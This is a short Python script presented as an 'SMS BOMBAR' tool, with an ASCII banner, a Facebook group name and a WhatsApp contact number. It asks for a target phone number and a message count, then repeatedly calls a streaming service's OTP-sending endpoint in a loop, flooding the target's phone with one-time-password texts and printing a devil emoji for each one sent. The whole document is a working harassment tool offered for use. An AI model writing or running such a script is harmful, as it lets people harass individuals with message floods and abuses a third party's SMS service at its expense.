import requests ,os 

os.system("clear")

m= """

 ▄▄▄▄    ▒█████   ███▄ ▄███▓

▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒

▒██▒ ▄██▒██░  ██▒▓██    ▓██░

▒██░█▀  ▒██   ██░▒██    ▒██ 

░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒

░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░

▒░▒   ░   ░ ▒ ▒░ ░  ░      ░

 ░    ░ ░ ░ ░ ▒  ░      ░   

 ░          ░ ░         ░   

      ░                     

════════════════════════════════════════════

FACEBOOK GRUOP : SECRET MAFIYA

WHATSUP : +8801939996203

WARNING  : DONT TRY TO COPPY MY SCRYPT

TOL  : SMS BOMBAR TOLS

════════════════════════════════════════════

"""

print(m)

number=str(input("ENTER TERGET NUMBER : "))

amount=int(input("ENTER SMS AMOUNT : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range  (amount):

   requests.get(api)

   print(str(i+1)+"SMS SEND 😈")
